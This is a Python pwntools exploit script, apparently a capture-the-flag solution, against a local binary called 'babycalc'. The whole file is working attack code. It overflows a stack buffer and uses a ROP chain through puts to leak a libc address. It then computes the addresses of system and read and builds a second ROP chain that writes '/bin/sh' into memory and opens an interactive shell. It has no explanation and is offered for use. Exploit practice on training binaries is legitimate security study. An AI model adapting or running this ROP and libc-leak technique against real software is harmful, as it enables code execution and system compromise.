from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./babycalc"])
elf = ELF("./babycalc")
libc = ELF("/home/nova/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret_addr = 0x400ca3
ret_addr = 0x04005b9

print(hex(puts_got), hex(puts_plt))

nums = [19, 36, 53, 70, 55, 66, 17, 161, 50, 131, 212, 101, 118, 199, 24, 3]
def pwn(v: bytes | int | str, offset: int, retaddr: bytes = p64(0)):
    if isinstance(v, int):
        v = str(v).encode()
    if isinstance(v, str):
        v = v.encode()
    payload = v.ljust(0x8, b'\x00')
    payload += p64(ret_addr)*((0x100-0x30-len(retaddr))//8 - 1)
    payload += retaddr
    for i in nums:
        payload += i.to_bytes(1, 'little')
    payload = payload.ljust(0x100-4, b'\x00') +  (offset+0x30).to_bytes(1, 'little').ljust(4, b'\x00')
    sh.sendafter(b"number-", payload)


pwn(0x18, 8, p64(0x400ca3) + p64(puts_got) + p64(puts_plt) + p64(0x400C1A))

sh.recvuntil(b"good done\n")
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x6f6a0
system_addr = libc_base + libc.sym['system']
read_addr = libc_base + libc.sym['read']

bss_addr = elf.bss() + 0x100
pop_rsi_ret_addr = libc_base + 0x202f8
pop_rdx_ret_addr = libc_base + 0x1b92

gdb.attach(sh, 'b *0x400bb8')
pause(3)
print(hex(libc_base))
print(hex(system_addr))
pwn(0x18, 8, p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_ret_addr) + p64(bss_addr) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(read_addr) + p64(pop_rdi_ret_addr) + p64(bss_addr) + p64(system_addr))
sh.sendline("/bin/sh\x00\x00")
sh.interactive()